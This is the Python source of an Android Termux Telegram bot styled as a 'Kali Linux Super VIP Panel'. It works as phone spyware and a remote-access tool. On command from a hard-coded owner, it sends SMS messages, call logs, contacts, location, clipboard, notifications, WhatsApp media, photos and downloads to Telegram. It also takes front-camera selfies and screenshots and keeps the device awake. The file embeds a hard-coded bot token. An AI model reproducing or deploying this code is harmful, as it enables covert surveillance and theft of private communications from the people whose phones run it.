import logging
import os
import subprocess
import time
import zipfile
import json
import shutil
from datetime import datetime

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes
from deep_translator import GoogleTranslator

logging.basicConfig(level=logging.INFO)

TOKEN = "8895257264:AAFozW3uX3e-uvOOpRbm0JcQWgbuiM9Yz44"
OWNER_ID = 8794826397
HOME = "/data/data/com.termux/files/home"
STORAGE = f"{HOME}/storage/shared"
SELFIE_DIR = f"{HOME}/selfies"
ZIP_DIR = f"{HOME}/zips"
WA_OLD = f"{STORAGE}/WhatsApp"
WA_NEW = f"{STORAGE}/Android/media/com.whatsapp/WhatsApp"

os.makedirs(SELFIE_DIR, exist_ok=True)
os.makedirs(ZIP_DIR, exist_ok=True)

# اللغة الافتراضية
USER_LANG = {"lang": "ar"}

TEXTS = {
    "ar": {
        "panel": "⚔️ *لوحة التحكم الخارقة* ⚔️\n\n🎛️ اختر ما تريد:",
        "files": "📁 الملفات", "photos": "🖼️ الصور", "audio": "🎵 الأصوات",
        "videos": "🎬 الفيديو", "docs": "📄 المستندات", "dl": "📥 التنزيلات",
        "selfie": "🤳 سيلفي", "loc": "📍 الموقع", "notif": "🔔 الإشعارات",
        "stats": "📊 الإحصائيات", "zipall": "🗜️ ضغط الكل",
        "zipphotos": "🗜️ ضغط الصور", "zipdl": "🗜️ ضغط التنزيلات",
        "zipwa": "📦 ضغط واتساب", "disk": "💾 التخزين", "batt": "🔋 البطارية",
        "wifi": "📡 الواي فاي", "clip": "📋 الحافظة", "sms": "✉️ الرسائل",
        "calls": "📞 المكالمات", "contacts": "👥 جهات الاتصال",
        "lang": "🌐 اللغة", "backup": "💾 نسخ احتياطي", "clean": "🧹 تنظيف",
        "sysinfo": "⚙️ النظام", "screen": "📸 لقطة شاشة", "vibrate": "📳 اهتزاز",
        "toast": "💬 رسالة منبثقة", "tts": "🔊 قراءة نص", "clipget": "📋 جلب الحافظة",
        "allapps": "📱 التطبيقات", "processes": "⚙️ العمليات", "netstat": "🌐 الشبكة"
    },
    "en": {
        "panel": "⚔️ *SUPER CONTROL PANEL* ⚔️\n\n🎛️ Choose an option:",
        "files": "📁 Files", "photos": "🖼️ Photos", "audio": "🎵 Audio",
        "videos": "🎬 Videos", "docs": "📄 Documents", "dl": "📥 Downloads",
        "selfie": "🤳 Selfie", "loc": "📍 Location", "notif": "🔔 Notifications",
        "stats": "📊 Stats", "zipall": "🗜️ ZIP All", "zipphotos": "🗜️ ZIP Photos",
        "zipdl": "🗜️ ZIP Downloads", "zipwa": "📦 ZIP WhatsApp", "disk": "💾 Disk",
        "batt": "🔋 Battery", "wifi": "📡 WiFi", "clip": "📋 Clipboard",
        "sms": "✉️ SMS", "calls": "📞 Calls", "contacts": "👥 Contacts",
        "lang": "🌐 Language", "backup": "💾 Backup", "clean": "🧹 Clean",
        "sysinfo": "⚙️ System", "screen": "📸 Screenshot", "vibrate": "📳 Vibrate",
        "toast": "💬 Toast", "tts": "🔊 TTS", "clipget": "📋 Get Clipboard",
        "allapps": "📱 Apps", "processes": "⚙️ Processes", "netstat": "🌐 Network"
    }
}

def T(key):
    return TEXTS[USER_LANG["lang"]].get(key, key)

def is_owner(update):
    return update.effective_user.id == OWNER_ID

def run_cmd(cmd, timeout=10):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip() if r.stdout else r.stderr.strip()
    except Exception as e:
        return f"Error: {e}"

# ═══════════════════════════════════════════
#        KALI VIP BANNER
# ═══════════════════════════════════════════
def show_banner():
    os.system("clear")
    R = "\033[1;31m"; B = "\033[1;34m"; C = "\033[1;36m"
    W = "\033[1;37m"; G = "\033[1;32m"; Y = "\033[1;33m"; X = "\033[0m"

    print(f"""{B}
     ██╗  ██╗ █████╗ ██╗     ██╗
     ██║ ██╔╝██╔══██╗██║     ██║
     █████╔╝ ███████║██║     ██║
     ██╔═██╗ ██╔══██║██║     ██║
     ██║  ██╗██║  ██║███████╗██║
     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
{X}""")
    print(f"""{R}
                  /\\
                 /  \\
                /    \\
               /      \\
              /   /\\   \\
             /___/__\\___\\
             \\   KALI   /
              \\  LINUX /
               \\______/
{X}""")
    print(f"{C}┌─────────────────────────────────────────┐{X}")
    print(f"{C}│{W}  ⚔  KALI LINUX SUPER VIP PANEL  ⚔  {C}│{X}")
    print(f"{C}├─────────────────────────────────────────┤{X}")
    print(f"{C}│{W}  ▸ User     : {G}Termux Owner         {C}│{X}")
    print(f"{C}│{W}  ▸ Mode     : {G}SUPER VIP            {C}│{X}")
    print(f"{C}│{W}  ▸ Time     : {G}{datetime.now().strftime('%Y-%m-%d %H:%M')}     {C}│{X}")
    print(f"{C}│{W}  ▸ Status   : {G}● ONLINE             {C}│{X}")
    print(f"{C}└─────────────────────────────────────────┘{X}\n")
    print(f"{Y}[*] Loading super modules...{X}")
    for i in range(0, 101, 5):
        bar = "█" * (i // 5) + "░" * (20 - i // 5)
        print(f"\r{C}[{bar}] {i}%{X}", end="", flush=True)
        time.sleep(0.03)
    print(f"\n{G}[✓] SYSTEM READY!{X}\n")

# ═══════════════════════════════════════════
#        WHATSAPP ZIP
# ═══════════════════════════════════════════
def zip_whatsapp():
    """يضغط ملفات واتساب من المسار الصحيح"""
    zip_path = f"{ZIP_DIR}/whatsapp_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
    count = 0
    
    # المسار الجديد (أندرويد 11+)
    wa_media = f"{WA_NEW}/Media"
    if not os.path.isdir(wa_media):
        # المسار القديم
        wa_media = f"{WA_OLD}/Media"
    if not os.path.isdir(wa_media):
        return None, 0, "WhatsApp folder not found"
    
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(wa_media):
            for f in files:
                try:
                    fp = os.path.join(root, f)
                    if os.path.getsize(fp) < 100 * 1024 * 1024:  # أقل من 100MB
                        arc = os.path.relpath(fp, wa_media)
                        zf.write(fp, arc)
                        count += 1
                except:
                    pass
    return zip_path, count, None

# ═══════════════════════════════════════════
#        BOT HANDLERS
# ═══════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    keyboard = [
        [InlineKeyboardButton(T("files"), callback_data="files"),
         InlineKeyboardButton(T("photos"), callback_data="photos")],
        [InlineKeyboardButton(T("audio"), callback_data="audio"),
         InlineKeyboardButton(T("videos"), callback_data="videos")],
        [InlineKeyboardButton(T("docs"), callback_data="docs"),
         InlineKeyboardButton(T("dl"), callback_data="dl")],
        [InlineKeyboardButton(T("selfie"), callback_data="selfie"),
         InlineKeyboardButton(T("loc"), callback_data="loc")],
        [InlineKeyboardButton(T("notif"), callback_data="notif"),
         InlineKeyboardButton(T("clip"), callback_data="clip")],
        [InlineKeyboardButton(T("zipall"), callback_data="zipall"),
         InlineKeyboardButton(T("zipphotos"), callback_data="zipphotos")],
        [InlineKeyboardButton(T("zipwa"), callback_data="zipwa"),
         InlineKeyboardButton(T("backup"), callback_data="backup")],
        [InlineKeyboardButton(T("disk"), callback_data="disk"),
         InlineKeyboardButton(T("batt"), callback_data="batt")],
        [InlineKeyboardButton(T("wifi"), callback_data="wifi"),
         InlineKeyboardButton(T("sysinfo"), callback_data="sysinfo")],
        [InlineKeyboardButton(T("sms"), callback_data="sms"),
         InlineKeyboardButton(T("calls"), callback_data="calls")],
        [InlineKeyboardButton(T("contacts"), callback_data="contacts"),
         InlineKeyboardButton(T("screen"), callback_data="screen")],
        [InlineKeyboardButton(T("lang"), callback_data="lang"),
         InlineKeyboardButton(T("clean"), callback_data="clean")],
    ]
    await update.message.reply_text(
        T("panel"),
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return
    d = q.data
    msg = q.message

    # ═══ SELFIE ═══
    if d == "selfie":
        await msg.reply_text("🤳 Capturing...")
        path = f"{SELFIE_DIR}/selfie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        if os.path.exists(path): os.remove(path)
        subprocess.run(["termux-camera-photo", "-c", "1", path])
        time.sleep(1.5)
        if os.path.exists(path) and os.path.getsize(path) > 0:
            await msg.reply_photo(open(path, "rb"), caption="🤳 Selfie")
        else:
            await msg.reply_text("❌ Camera failed. Check Termux:API permissions.")

    # ═══ MEDIA ═══
    elif d == "photos": await send_recent(msg, f"{STORAGE}/DCIM", "🖼️", ".jpg")
    elif d == "videos": await send_recent(msg, f"{STORAGE}/DCIM", "🎬", ".mp4")
    elif d == "audio": await send_recent(msg, f"{STORAGE}/Music", "🎵", ".mp3")
    elif d == "docs": await send_recent(msg, f"{STORAGE}/Documents", "📄", ".pdf")
    elif d == "dl": await send_recent(msg, f"{STORAGE}/Download", "📥", "")

    # ═══ ZIP ═══
    elif d == "zipall":
        await msg.reply_text("🗜️ Zipping all storage...")
        folders = [f"{STORAGE}/DCIM", f"{STORAGE}/Download", f"{STORAGE}/Documents",
                   f"{STORAGE}/Pictures", f"{STORAGE}/Music", f"{STORAGE}/Movies"]
        name = f"all_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
        zp, cnt = make_zip(folders, name)
        await send_zip(msg, zp, cnt)

    elif d == "zipphotos":
        await msg.reply_text("🗜️ Zipping photos...")
        name = f"photos_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
        zp, cnt = make_zip([f"{STORAGE}/DCIM", f"{STORAGE}/Pictures"], name)
        await send_zip(msg, zp, cnt)

    elif d == "zipwa":
        await msg.reply_text("📦 Zipping WhatsApp... this may take time.")
        zp, cnt, err = zip_whatsapp()
        if err:
            await msg.reply_text(f"❌ {err}")
        else:
            await send_zip(msg, zp, cnt)

    # ═══ SYSTEM ═══
    elif d == "loc":
        out = run_cmd(["termux-location"])
        await msg.reply_text(f"📍 `{out}`", parse_mode="Markdown")

    elif d == "notif":
        out = run_cmd(["termux-notification-list"])
        try:
            data = json.loads(out)
            if not data: await msg.reply_text("📭 No notifications.")
            else:
                txt = "🔔 *Notifications:*\n\n"
                for n in data[:10]:
                    txt += f"📱 *{n.get('packageName','?').split('.')[-1]}*\n_{n.get('title','')}_\n{n.get('content','')}\n\n"
                await msg.reply_text(txt, parse_mode="Markdown")
        except: await msg.reply_text(f"📭 {out[:500]}")

    elif d == "clip":
        out = run_cmd(["termux-clipboard-get"])
        await msg.reply_text(f"📋 Clipboard:\n`{out[:1000]}`", parse_mode="Markdown")

    elif d == "disk":
        out = run_cmd(["df", "-h", STORAGE])
        await msg.reply_text(f"💾 `{out}`", parse_mode="Markdown")

    elif d == "batt":
        out = run_cmd(["termux-battery-status"])
        await msg.reply_text(f"🔋 `{out}`", parse_mode="Markdown")

    elif d == "wifi":
        out = run_cmd(["termux-wifi-connectioninfo"])
        await msg.reply_text(f"📡 `{out[:800]}`", parse_mode="Markdown")

    elif d == "sms":
        out = run_cmd(["termux-sms-list", "-l", "5"])
        await msg.reply_text(f"✉️ `{out[:1000]}`", parse_mode="Markdown")

    elif d == "calls":
        out = run_cmd(["termux-call-log", "-l", "5"])
        await msg.reply_text(f"📞 `{out[:1000]}`", parse_mode="Markdown")

    elif d == "contacts":
        out = run_cmd(["termux-contact-list"])
        await msg.reply_text(f"👥 `{out[:1000]}`", parse_mode="Markdown")

    elif d == "screen":
        path = f"{SELFIE_DIR}/screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        subprocess.run(["termux-screenshot", "-f", path])
        time.sleep(1)
        if os.path.exists(path):
            await msg.reply_photo(open(path, "rb"), caption="📸 Screenshot")
        else:
            await msg.reply_text("❌ Screenshot failed.")

    elif d == "sysinfo":
        up = run_cmd(["uptime"])
        mem = run_cmd(["free", "-h"])
        cpu = run_cmd(["nproc"])
        await msg.reply_text(f"⚙️ *System:*\n`{up}`\n`{mem}`\nCPU cores: {cpu}", parse_mode="Markdown")

    elif d == "clean":
        await msg.reply_text("🧹 Cleaning cache...")
        os.system("rm -rf ~/.cache/* 2>/dev/null")
        os.system("pkg clean -y 2>/dev/null")
        await msg.reply_text("✅ Cache cleaned!")

    elif d == "backup":
        await msg.reply_text("💾 Creating full backup...")
        name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M')}.zip"
        zp, cnt = make_zip([f"{STORAGE}/DCIM", f"{STORAGE}/Download",
                            f"{STORAGE}/Documents", f"{STORAGE}/Pictures"], name)
        await send_zip(msg, zp, cnt)

    elif d == "lang":
        new = "en" if USER_LANG["lang"] == "ar" else "ar"
        USER_LANG["lang"] = new
        await msg.reply_text(f"🌐 Language: {'English' if new=='en' else 'العربية'}")
        await start(update, context)

    elif d == "files":
        await msg.reply_text("📁 Send folder name after /get\nExample: `/get Download`", parse_mode="Markdown")

async def send_recent(msg, folder, emoji, ext):
    if not os.path.isdir(folder):
        await msg.reply_text(f"❌ Not found: {folder}")
        return
    files = []
    for root, _, names in os.walk(folder):
        for n in names:
            if ext and not n.lower().endswith(ext): continue
            files.append(os.path.join(root, n))
    files.sort(key=os.path.getmtime, reverse=True)
    if not files:
        await msg.reply_text("No files.")
        return
    await msg.reply_text(f"{emoji} Latest {min(5, len(files))}:")
    for f in files[:5]:
        try:
            sz = os.path.getsize(f) / (1024*1024)
            if sz > 50:
                await msg.reply_text(f"⚠️ {os.path.basename(f)} ({sz:.1f}MB)")
                continue
            if ext == ".jpg": await msg.reply_photo(open(f,"rb"), caption=os.path.basename(f))
            elif ext == ".mp4": await msg.reply_video(open(f,"rb"), caption=os.path.basename(f))
            elif ext == ".mp3": await msg.reply_audio(open(f,"rb"), caption=os.path.basename(f))
            else: await msg.reply_document(open(f,"rb"), filename=os.path.basename(f))
        except Exception as e: await msg.reply_text(f"Err: {e}")

def make_zip(folders, name):
    zp = f"{ZIP_DIR}/{name}"
    cnt = 0
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as zf:
        for folder in folders:
            if not os.path.isdir(folder): continue
            for root, _, files in os.walk(folder):
                for f in files:
                    try:
                        fp = os.path.join(root, f)
                        if os.path.getsize(fp) < 50*1024*1024:
                            zf.write(fp, os.path.relpath(fp, STORAGE))
                            cnt += 1
                    except: pass
    return zp, cnt

async def send_zip(msg, zp, cnt):
    if not os.path.exists(zp):
        await msg.reply_text("❌ ZIP failed.")
        return
    sz = os.path.getsize(zp) / (1024*1024)
    if sz > 50:
        await msg.reply_text(f"⚠️ Too large ({sz:.1f}MB)\n📁 {cnt} files\n💾 `{zp}`", parse_mode="Markdown")
    else:
        await msg.reply_document(open(zp,"rb"), filename=os.path.basename(zp),
                                 caption=f"✅ {cnt} files ({sz:.1f}MB)")

async def get_folder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    if not context.args:
        await update.message.reply_text("Example: /get Download")
        return
    folder = os.path.join(STORAGE, context.args[0])
    if not os.path.isdir(folder):
        await update.message.reply_text("❌ Not found.")
        return
    cnt = 0
    for root, _, names in os.walk(folder):
        for n in names:
            try:
                await update.message.reply_document(open(os.path.join(root,n),"rb"))
                cnt += 1
                if cnt >= 20:
                    await update.message.reply_text("Sent 20 files.")
                    return
            except: pass
    await update.message.reply_text(f"✅ Sent {cnt} files.")

async def translate_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update): return
    if not context.args:
        await update.message.reply_text("Usage: /tr <text>")
        return
    txt = " ".join(context.args)
    try:
        tr = GoogleTranslator(source="auto", target="ar").translate(txt)
        await update.message.reply_text(f"🌐 {tr}")
    except Exception as e:
        await update.message.reply_text(f"Err: {e}")

# ═══════════════════════════════════════════
#        MAIN
# ═══════════════════════════════════════════
def main():
    os.system("termux-wake-lock")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("get", get_folder))
    app.add_handler(CommandHandler("tr", translate_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.run_polling()

if __name__ == "__main__":
    show_banner()
    main()
